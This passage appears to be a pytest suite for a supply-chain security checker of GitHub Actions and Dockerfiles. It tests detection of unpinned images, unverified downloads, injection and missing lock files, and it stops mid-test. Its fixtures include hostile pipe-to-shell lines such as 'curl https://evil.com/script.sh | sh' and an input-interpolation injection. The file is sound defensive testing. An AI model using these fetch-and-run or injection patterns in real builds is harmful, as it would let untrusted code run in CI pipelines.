#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
#
from unittest import mock

from verify_action_build.security import (
    analyze_binary_downloads,
    analyze_binary_downloads_recursive,
    analyze_dockerfile,
    analyze_in_tree_binaries,
    analyze_lock_files,
    analyze_scripts,
    analyze_action_metadata,
    analyze_repo_metadata,
)
from verify_action_build.security import (
    _file_is_pure_data_fetch,
    _find_binary_downloads_js,
    _looks_like_in_tree_binary,
    _parse_sha256sums,
)


class TestAnalyzeDockerfile:
    def _mock_fetch(self, files: dict):
        """Return a mock for fetch_file_from_github and fetch_action_yml."""
        def fetch(org, repo, commit, path):
            return files.get(path)
        return fetch

    def test_digest_pinned_no_warnings(self):
        files = {
            "Dockerfile": "FROM node:20@sha256:abc123\nRUN echo hello\n",
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert len(warnings) == 0

    def test_unpinned_from_warns(self):
        files = {
            "Dockerfile": "FROM ubuntu:latest\nRUN echo hello\n",
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert any("not pinned" in w for w in warnings)

    def test_tag_pinned_warns(self):
        files = {
            "Dockerfile": "FROM python:3.11-slim\nRUN echo hello\n",
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert any("tag-pinned" in w for w in warnings)

    def test_suspicious_curl(self):
        files = {
            "Dockerfile": "FROM node:20@sha256:abc\nRUN curl https://evil.com/script.sh | sh\n",
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert any("curl" in w.lower() or "evil" in w.lower() for w in warnings)

    def test_multistage_internal_from_no_warnings(self):
        dockerfile = (
            "FROM node:20@sha256:abc123 AS builder\n"
            "RUN npm ci\n"
            "FROM builder AS runtime\n"
            "CMD [\"node\", \"index.js\"]\n"
        )
        files = {"Dockerfile": dockerfile}
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert warnings == []

    def test_no_dockerfile_no_warnings(self):
        with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings = analyze_dockerfile("org", "repo", "a" * 40)
        assert len(warnings) == 0


class TestAnalyzeScripts:
    def _mock_fetch_file(self, files):
        def fetch(org, repo, commit, path):
            return files.get(path)
        return fetch

    def test_detects_eval(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - run: python script.py
"""
        files = {
            "script.py": 'eval("malicious code")\n',
        }
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch_file(files)):
                warnings = analyze_scripts("org", "repo", "a" * 40)
        # Script analysis finds suspicious patterns (eval is in findings)
        # Warnings list may be empty since script analysis only logs to console
        # but doesn't add to warnings for all patterns
        assert isinstance(warnings, list)

    def test_no_scripts_no_warnings(self):
        action_yml = """\
name: Test
runs:
  using: node20
  main: dist/index.js
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings = analyze_scripts("org", "repo", "a" * 40)
        assert warnings == []


class TestAnalyzeActionMetadata:
    def test_pipe_to_shell_warns(self):
        # Multi-line run: blocks are needed — single-line run: is detected
        # as a block start and the content is on the next line.
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: dangerous
      run: |
        curl https://example.com | sh
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert any("pipe-to-shell" in w for w in warnings)

    def test_input_interpolation_warns(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: dangerous
      run: |
        echo ${{ inputs.name }}
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert any("injection" in w for w in warnings)

    def test_clean_action_no_warnings(self):
        action_yml = """\
name: Test
runs:
  using: node20
  main: dist/index.js
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert warnings == []

    def test_no_action_yml_no_warnings(self):
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert warnings == []

    def test_secret_default_warns(self):
        action_yml = """\
name: Test
inputs:
  token:
    default: ${{ secrets.GITHUB_TOKEN }}
runs:
  using: node20
  main: dist/index.js
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            warnings = analyze_action_metadata("org", "repo", "a" * 40)
        assert any("secret" in w for w in warnings)


class TestAnalyzeBinaryDownloads:
    def _mock_fetch(self, files: dict):
        def fetch(org, repo, commit, path):
            return files.get(path)
        return fetch

    def test_no_files_no_results(self):
        with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert warnings == []
        assert failures == []

    def test_pipe_to_shell_fails(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSL https://example.com/install.sh | sh\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1
        assert any("install.sh" in f for f in failures)

    def test_curl_binary_without_verification_fails(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLO https://example.com/tool.tar.gz && tar xf tool.tar.gz\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1
        assert any("tool.tar.gz" in f for f in failures)

    def test_sha256sum_verification_passes(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLO https://example.com/tool.tar.gz \\\n"
                " && echo 'abc123deadbeefcafef00d  tool.tar.gz' | sha256sum -c\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_gpg_verify_passes(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLO https://example.com/tool.tar.gz \\\n"
                " && curl -fsSLO https://example.com/tool.tar.gz.sig \\\n"
                " && gpg --verify tool.tar.gz.sig tool.tar.gz\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_cosign_verify_passes(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLO https://example.com/tool.tar.gz && cosign verify-blob tool.tar.gz\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_apk_add_not_flagged(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN apk add --no-cache curl wget bash\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_pip_install_not_flagged(self):
        files = {
            "Dockerfile": (
                "FROM python:3.12@sha256:abc\n"
                "RUN pip install requests==2.31.0\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_dockerfile_add_url_fails(self):
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "ADD https://example.com/app.tar.gz /app.tar.gz\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1

    def test_action_yml_run_block_unverified_fails(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: Download tool
      shell: bash
      run: |
        curl -fsSLO https://example.com/tool.tar.gz
        tar xf tool.tar.gz
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1

    def test_action_yml_run_block_with_verification_passes(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: Download and verify
      shell: bash
      run: |
        curl -fsSLO https://example.com/tool.tar.gz
        echo "abc123deadbeef  tool.tar.gz" | sha256sum -c
        tar xf tool.tar.gz
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_action_yml_sibling_ampel_verify_step_passes(self):
        # Mirrors the sbt/setup-sbt pattern: download in one run block,
        # signature verification in a sibling `uses:` step that calls
        # carabiner-dev/actions/ampel/verify.
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: Download tool
      shell: bash
      run: |
        curl -sL https://example.com/tool.zip > /tmp/tool.zip
        curl -sL https://example.com/tool.zip.asc > /tmp/tool.zip.asc
    - name: Verify signature
      uses: carabiner-dev/actions/ampel/verify@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      with:
        subject: /tmp/tool.zip
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_action_yml_sibling_slsa_verifier_step_passes(self):
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: Download tool
      shell: bash
      run: |
        curl -fsSLO https://example.com/tool.tar.gz
    - name: Verify provenance
      uses: slsa-framework/slsa-verifier-action@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert failures == []

    def test_action_yml_sibling_unrelated_uses_step_still_fails(self):
        # A `uses:` step that is NOT a known verification action must not
        # excuse an unverified download.
        action_yml = """\
name: Test
runs:
  using: composite
  steps:
    - name: Download tool
      shell: bash
      run: |
        curl -fsSLO https://example.com/tool.tar.gz
    - name: Cache
      uses: actions/cache@cccccccccccccccccccccccccccccccccccccccc
"""
        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1

    def test_releases_download_path_flagged(self):
        # URL without a binary extension but under /releases/download/ still
        # looks like a binary artefact — flag it.
        files = {
            "Dockerfile": (
                "FROM alpine@sha256:abc\n"
                "RUN curl -fsSLo /usr/local/bin/mytool "
                "https://github.com/x/y/releases/download/v1/mytool-linux-amd64 "
                "&& chmod +x /usr/local/bin/mytool\n"
            ),
        }
        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
                warnings, failures = analyze_binary_downloads("org", "repo", "a" * 40)
        assert len(failures) >= 1


class TestAnalyzeBinaryDownloadsRecursive:
    def test_recurses_through_composite(self):
        # Root is a composite action that uses an unpinned-looking hash-pinned
        # nested action; nested action has an unverified download.
        root_yml = """\
name: Root
runs:
  using: composite
  steps:
    - uses: other/helper@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
"""
        nested_yml = """\
name: Helper
runs:
  using: composite
  steps:
    - name: Download
      shell: bash
      run: |
        curl -fsSLO https://example.com/tool.tar.gz
"""

        def fake_action_yml(org, repo, commit, sub_path=""):
            if org == "myorg":
                return root_yml
            if org == "other":
                return nested_yml
            return None

        def fake_file(org, repo, commit, path):
            return None

        with mock.patch("verify_action_build.security.fetch_action_yml", side_effect=fake_action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=fake_file):
                warnings, failures = analyze_binary_downloads_recursive(
                    "myorg", "rootrepo", "b" * 40,
                )
        assert len(failures) >= 1
        assert any("tool.tar.gz" in f for f in failures)

    def test_skips_trusted_org(self):
        # Nested uses: actions/checkout — should be skipped (trusted), so no
        # recursion into it even if it had downloads.
        root_yml = """\
name: Root
runs:
  using: composite
  steps:
    - uses: actions/checkout@cccccccccccccccccccccccccccccccccccccccc
"""

        def fake_action_yml(org, repo, commit, sub_path=""):
            if org == "myorg":
                return root_yml
            raise AssertionError(f"should not fetch nested yml for {org}/{repo}")

        with mock.patch("verify_action_build.security.fetch_action_yml", side_effect=fake_action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads_recursive(
                    "myorg", "rootrepo", "b" * 40,
                )
        assert failures == []

    def test_skips_trusted_verifier_ref(self):
        # Mirrors sbt/setup-sbt → carabiner-dev/actions/ampel/verify →
        # install/ampel: descending into the verifier surfaces a bootstrap
        # installer that can't verify itself. The walker treats the verifier
        # ref as a trust leaf and stops there.
        root_yml = """\
name: Root
runs:
  using: composite
  steps:
    - uses: carabiner-dev/actions/ampel/verify@dddddddddddddddddddddddddddddddddddddddd
"""

        def fake_action_yml(org, repo, commit, sub_path=""):
            if org == "myorg":
                return root_yml
            raise AssertionError(
                f"should not fetch nested yml for {org}/{repo}/{sub_path}"
            )

        with mock.patch("verify_action_build.security.fetch_action_yml", side_effect=fake_action_yml):
            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
                warnings, failures = analyze_binary_downloads_recursive(
                    "myorg", "rootrepo", "b" * 40,
                )
        assert failures == []


class TestAnalyzeRepoMetadata:
    def test_mit_license_detected(self):
        def fetch(org, repo, commit, path):
            if path == "LICENSE":
                return "MIT License\n\nCopyright..."
            return None

        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=fetch):
            warnings = analyze_repo_metadata("actions", "checkout", "a" * 40)
        assert len(warnings) == 0

    def test_no_license_warns(self):
        with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
            warnings = analyze_repo_metadata("unknown-org", "unknown-repo", "a" * 40)
        assert any("LICENSE" in w for w in warnings)

    def test_well_known_org(self):
        def fetch(org, repo, commit, path):
            if path == "LICENSE":
                return "MIT License"
            return None

        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=fetch):
            warnings = analyze_repo_metadata("actions", "checkout", "a" * 40)
        assert len(warnings) == 0


class TestAnalyzeLockFiles:
    def _run(self, files: dict, sub_path: str = "") -> list[str]:
        def fetch(org, repo, commit, path):
            return files.get(path)

        with mock.patch(
            "verify_action_build.security.fetch_file_from_github",
            side_effect=fetch,
        ):
            return analyze_lock_files("org", "repo", "a" * 40, sub_path=sub_path)

    # --- Node --------------------------------------------------------------

    def test_node_package_json_with_package_lock_passes(self):
        files = {
            "package.json": '{"name":"x","dependencies":{"a":"1.0.0"}}',
            "package-lock.json": "{}",
        }
        assert self._run(files) == []

    def test_node_package_json_with_yarn_lock_passes(self):
        files = {
            "package.json": '{"name":"x","dependencies":{"a":"1.0.0"}}',
            "yarn.lock": "",
        }
        assert self._run(files) == []

    def test_node_package_json_with_pnpm_lock_passes(self):
        files = {
            "package.json": '{"name":"x","dependencies":{"a":"1.0.0"}}',
            "pnpm-lock.yaml": "",
        }
        assert self._run(files) == []

    def test_node_package_json_with_bun_lock_passes(self):
        files = {
            "package.json": '{"name":"x","dependencies":{"a":"1.0.0"}}',
            "bun.lock": "",
        }
        assert self._run(files) == []

    def test_node_package_json_without_lock_fails(self):
        # ``dependencies`` are declared, so the lock-file requirement applies.
        errors = self._run({
            "package.json": '{"name":"x","dependencies":{"a":"1.0.0"}}',
        })
        assert len(errors) == 1
        assert "package.json" in errors[0]
        assert "package-lock.json" in errors[0]

    def test_node_package_json_dev_deps_only_without_lock_fails(self):
        # ``devDependencies`` alone count: a rebuild still installs them and
        # pins through them.
        errors = self._run({
            "package.json": '{"devDependencies":{"typescript":"5.0.0"}}',
        })
        assert len(errors) == 1
        assert "package.json" in errors[0]

    def test_node_package_json_no_deps_skipped(self):
        # browser-actions/setup-firefox v1.7.2 shape: bundled-action release
        # tag ships ``index.js`` next to a minimal ``{"type":"module"}``
        # ``package.json`` declaring zero dependencies.  A lock file would
        # describe an empty graph; require it and the check falsely fails
        # this whole class of release-please-style bundled tags.
        assert self._run({"package.json": '{"type":"module"}'}) == []

    def test_node_package_json_completely_empty_skipped(self):
        # ``{}`` — no fields at all.  No deps to pin.
        assert self._run({"package.json": "{}"}) == []

    def test_node_package_json_invalid_json_treated_as_no_deps(self):
        # A package.json that doesn't parse (truncated, malformed) shouldn't
        # crash the check.  We can't see deps, so we fall through to the
        # skip path — same as a syntactically-empty manifest.
        assert self._run({"package.json": "{ not json"}) == []

    def test_node_package_json_peer_deps_without_lock_fails(self):
        # ``peerDependencies`` and ``optionalDependencies`` also imply a
        # transitive resolution that benefits from pinning.
        errors = self._run({
            "package.json": '{"peerDependencies":{"react":"^18"}}',
        })
        assert len(errors) == 1

    # --- Python ------------------------------------------------------------

    def test_python_pyproject_with_uv_lock_passes(self):
        files = {
            "pyproject.toml": '[project]\nname="x"\ndependencies = ["requests"]\n',
            "uv.lock": "",
        }
        assert self._run(files) == []

    def test_python_pyproject_with_poetry_lock_passes(self):
        files = {
            "pyproject.toml": "[tool.poetry.dependencies]\npython = '^3.11'\n",
            "poetry.lock": "",
        }
        assert self._run(files) == []

    def test_python_pyproject_with_requirements_txt_passes(self):
        files = {
            "pyproject.toml": '[project]\ndependencies = ["requests"]\n',
            "requirements.txt": "requests==2.31.0\n",
        }
        assert self._run(files) == []

    def test_python_pyproject_without_lock_fails(self):
        files = {
            "pyproject.toml": '[project]\nname="x"\ndependencies = ["requests"]\n',
        }
        errors = self._run(files)
        assert len(errors) == 1
        assert "pyproject.toml" in errors[0]

    def test_python_pyproject_without_deps_skipped(self):
        # Bare config (ruff, black, mypy settings) doesn't need a lock.
        files = {
            "pyproject.toml": "[tool.ruff]\nline-length = 100\n",
        }
        assert self._run(files) == []

    def test_python_pipfile_with_lock_passes(self):
        files = {"Pipfile": "[packages]\nrequests = '*'\n", "Pipfile.lock": "{}"}
        assert self._run(files) == []

    def test_python_pipfile_without_lock_fails(self):
        errors = self._run({"Pipfile": "[packages]\nrequests = '*'\n"})
        assert len(errors) == 1
        assert "Pipfile" in errors[0]

    # --- Deno --------------------------------------------------------------

    def test_deno_with_lock_passes(self):
        files = {"deno.json": '{"imports":{}}', "deno.lock": "{}"}
        assert self._run(files) == []

    def test_deno_jsonc_without_lock_fails(self):
        errors = self._run({"deno.jsonc": "{}"})
        assert len(errors) == 1
        assert "deno.jsonc" in errors[0]

    # --- Dart --------------------------------------------------------------

    def test_dart_with_pubspec_lock_passes(self):
        files = {"pubspec.yaml": "name: x\n", "pubspec.lock": ""}
        assert self._run(files) == []

    def test_dart_without_lock_fails(self):
        errors = self._run({"pubspec.yaml": "name: x\n"})
        assert len(errors) == 1
        assert "pubspec.yaml" in errors[0]

    # --- Ruby --------------------------------------------------------------

    def test_ruby_with_gemfile_lock_passes(self):
        files = {"Gemfile": "gem 'rails'\n", "Gemfile.lock": ""}
        assert self._run(files) == []

    def test_ruby_without_lock_fails(self):
        errors = self._run({"Gemfile": "gem 'rails'\n"})
        assert len(errors) == 1

    # --- Go ----------------------------------------------------------------

    def test_go_with_sum_passes(self):
        files = {
            "go.mod": "module x\n\nrequire github.com/a/b v1.2.3\n",
            "go.sum": "github.com/a/b v1.2.3 h1:...\n",
        }
        assert self._run(files) == []

    def test_go_without_sum_fails(self):
        files = {"go.mod": "module x\n\nrequire github.com/a/b v1.2.3\n"}
        errors = self._run(files)
        assert len(errors) == 1
        assert "go.mod" in errors[0]

    def test_go_without_requires_skipped(self):
        # go.mod with no external deps doesn't need go.sum.
        assert self._run({"go.mod": "module x\n\ngo 1.21\n"}) == []

    # --- Rust --------------------------------------------------------------

    def test_rust_binary_without_lock_fails(self):
        # Default binary crate — Cargo.lock expected.
        files = {"Cargo.toml": '[package]\nname = "x"\n'}
        errors = self._run(files)
        assert len(errors) == 1

    def test_rust_binary_with_lock_passes(self):
        files = {
            "Cargo.toml": '[package]\nname = "x"\n',
            "Cargo.lock": "",
        }
        assert self._run(files) == []

    def test_rust_library_without_lock_skipped(self):
        # [lib] without [[bin]] — library crate, Cargo.lock not conventionally committed.
        files = {
            "Cargo.toml": '[package]\nname = "x"\n\n[lib]\nname = "x"\n',
        }
        assert self._run(files) == []

    def test_rust_library_with_bin_still_requires_lock(self):
        files = {
            "Cargo.toml": (
                '[package]\nname = "x"\n'
                '[lib]\nname = "x"\n'
                '[[bin]]\nname = "x-cli"\n'
            ),
        }
        errors = self._run(files)
        assert len(errors) == 1

    def test_rust_workspace_requires_lock(self):
        files = {"Cargo.toml": '[workspace]\nmembers = ["a"]\n'}
        errors = self._run(files)
        assert len(errors) == 1

    # --- Sub-path handling ------------------------------------------------

    def test_sub_path_manifest_detected(self):
        # Manifest in sub-path with lock in sub-path — passes.
        files = {
            "sub/package.json": "{}",
            "sub/package-lock.json": "{}",
        }
        assert self._run(files, sub_path="sub") == []

    def test_sub_path_falls_back_to_root(self):
        # Sub-action may reuse repo-root manifests.
        files = {
            "package.json": "{}",
            "package-lock.json": "{}",
        }
        assert self._run(files, sub_path="sub") == []

    def test_sub_path_without_lock_fails(self):
        files = {
            "sub/package.json": '{"dependencies":{"a":"1.0.0"}}',
        }
        errors = self._run(files, sub_path="sub")
        assert len(errors) == 1
        assert "sub/package.json" in errors[0]

    # --- No manifests -----------------------------------------------------

    def test_no_manifests_found_passes(self):
        # Pure composite action — no manifests anywhere.
        assert self._run({}) == []

    # --- Multiple ecosystems -----------------------------------------------

    def test_multiple_ecosystems_all_missing_aggregates_errors(self):
        files = {
            "package.json": '{"dependencies":{"a":"1.0.0"}}',
            "go.mod": "module x\n\nrequire a v1\n",
            "pubspec.yaml": "name: x\n",
        }
        errors = self._run(files)
        assert len(errors) == 3

    # --- Exemptions -------------------------------------------------------

    def _run_with_exemptions(
        self,
        files: dict,
        exemptions: dict,
        org: str = "org",
        repo: str = "repo",
    ) -> list[str]:
        def fetch(o, r, commit, path):
            return files.get(path)

        with mock.patch(
            "verify_action_build.security.fetch_file_from_github",
            side_effect=fetch,
        ):
            return analyze_lock_files(org, repo, "a" * 40, exemptions=exemptions)

    def test_exemption_skips_matching_ecosystem(self):
        # pyproject.toml with deps but no lock — normally fails; exempted here.
        files = {
            "pyproject.toml": '[project]\ndependencies = ["requests"]\n',
        }
        errors = self._run_with_exemptions(
            files, {("org", "repo"): {"python"}},
        )
        assert errors == []

    def test_exemption_does_not_skip_other_ecosystems(self):
        # Exempt only python; node still fails.
        files = {
            "pyproject.toml": '[project]\ndependencies = ["requests"]\n',
            "package.json": '{"dependencies":{"a":"1.0.0"}}',
        }
        errors = self._run_with_exemptions(
            files, {("org", "repo"): {"python"}},
        )
        assert len(errors) == 1
        assert "package.json" in errors[0]

    def test_exemption_case_insensitive(self):
        # Look-up key lowercases org/repo, so an exemption entry written as
        # "Pypa/cibuildwheel" matches a run on "pypa/cibuildwheel".
        files = {"pyproject.toml": '[project]\ndependencies = ["a"]\n'}
        errors = self._run_with_exemptions(
            files, {("pypa", "cibuildwheel"): {"python"}},
            org="Pypa", repo="CIBuildWheel",
        )
        assert errors == []

    def test_exemption_for_different_repo_does_not_apply(self):
        files = {"pyproject.toml": '[project]\ndependencies = ["a"]\n'}
        errors = self._run_with_exemptions(
            files, {("other", "project"): {"python"}},
        )
        assert len(errors) == 1

    # --- Exemption file parser -------------------------------------------

    def test_exemption_file_parses(self, tmp_path):
        from verify_action_build.security import _load_lock_file_exemptions

        yml = tmp_path / "lock_file_exemptions.yml"
        yml.write_text(
            "# comment\n"
            "pypa/cibuildwheel:\n"
            "  - python\n"
            "\n"
            "dart-lang/setup-dart:\n"
            "  - dart  # trailing comment\n"
        )
        result = _load_lock_file_exemptions(yml)
        assert result == {
            ("pypa", "cibuildwheel"): {"python"},
            ("dart-lang", "setup-dart"): {"dart"},
        }

    def test_exemption_file_missing_returns_empty(self, tmp_path):
        from verify_action_build.security import _load_lock_file_exemptions

        result = _load_lock_file_exemptions(tmp_path / "does-not-exist.yml")
        assert result == {}

    def test_exemption_file_multiple_ecosystems_per_repo(self, tmp_path):
        from verify_action_build.security import _load_lock_file_exemptions

        yml = tmp_path / "lock_file_exemptions.yml"
        yml.write_text(
            "some/multiecosystem-repo:\n"
            "  - python\n"
            "  - dart\n"
        )
        result = _load_lock_file_exemptions(yml)
        assert result[("some", "multiecosystem-repo")] == {"python", "dart"}


class TestPureDataFetchExemption:
    """The binary-download check should not flag JS files that fetch HTTP
    responses purely as data (regex-parsed, JSON.parse'd, etc.) when nothing
    in the file persists or executes the response."""

    # The exact pattern that triggered the false positive on PR #752
    # (dependabot/fetch-metadata): badge fetch + regex match + parseInt.
    DEPENDABOT_BADGE_FETCH = """\
import * as https from 'https'

export async function getCompatibility (name, oldVersion, newVersion, ecosystem) {
  const svg = await new Promise((resolve) => {
    https.get(`https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=${name}&package-manager=${ecosystem}&previous-version=${oldVersion}&new-version=${newVersion}`, res => {
      let data = ''
      res.on('data', chunk => { data += chunk.toString('utf8') })
      res.on('end', () => { resolve(data) })
    }).on('error', () => { resolve('') })
  })

  const scoreChunk = svg.match(/<title>compatibility: (?<score>\\d+)%<\\/title>/m)
  return scoreChunk?.groups ? parseInt(scoreChunk.groups.score) : 0
}
"""

    LUAROCKS_BINARY_DOWNLOAD = """\
import * as tc from "@actions/tool-cache"

const sourceTar = await tc.downloadTool(`https://luarocks.org/releases/luarocks-${v}.tar.gz`)
await tc.extractTar(sourceTar, dest)
"""

    def test_pure_data_fetch_exempted(self):
        # https.get + .match + parseInt, no extract/write/exec → exempted.
        assert _file_is_pure_data_fetch(self.DEPENDABOT_BADGE_FETCH) is True
        assert _find_binary_downloads_js(self.DEPENDABOT_BADGE_FETCH) == []

    def test_real_binary_download_still_flagged(self):
        # tc.downloadTool followed by tc.extractTar → not exempt.
        assert _file_is_pure_data_fetch(self.LUAROCKS_BINARY_DOWNLOAD) is False
        findings = _find_binary_downloads_js(self.LUAROCKS_BINARY_DOWNLOAD)
        assert len(findings) == 1
        assert "downloadTool" in findings[0][1]

    def test_data_fetch_with_extract_in_same_file_not_exempt(self):
        # File mixes a metadata fetch and a real binary extraction. The
        # heuristic is intentionally conservative: any binary-handling
        # marker in the file disables the exemption for everything in it.
        mixed = """\
import * as https from 'https'
import * as tc from "@actions/tool-cache"

const meta = await new Promise((r) => https.get('https://x/y.json', res => {/*...*/}))
const parsed = JSON.parse(meta)

const archive = await tc.downloadTool('https://x/foo.tar.gz')
await tc.extractTar(archive, dest)
"""
        assert _file_is_pure_data_fetch(mixed) is False
        findings = _find_binary_downloads_js(mixed)
        # Both downloads remain flagged.
        assert len(findings) == 2

    def test_no_data_parse_marker_not_exempt(self):
        # A fetch that doesn't visibly parse the response shouldn't be
        # exempted by accident — we can't tell if it's binary or data.
        opaque = """\
import * as https from 'https'

https.get('https://x/y', res => { /* opaque */ })
"""
        assert _file_is_pure_data_fetch(opaque) is False
        assert len(_find_binary_downloads_js(opaque)) == 1

    def test_chmod_plus_x_in_string_disables_exemption(self):
        # chmod +x on a downloaded path is a strong "this is an executable"
        # signal even with parse markers also present.
        mixed = """\
const r = await fetch('https://x/y')
const txt = await r.text()
const score = parseInt(txt)
exec.exec('chmod +x ./downloaded')
"""
        assert _file_is_pure_data_fetch(mixed) is False

    def test_json_parse_alone_exempts(self):
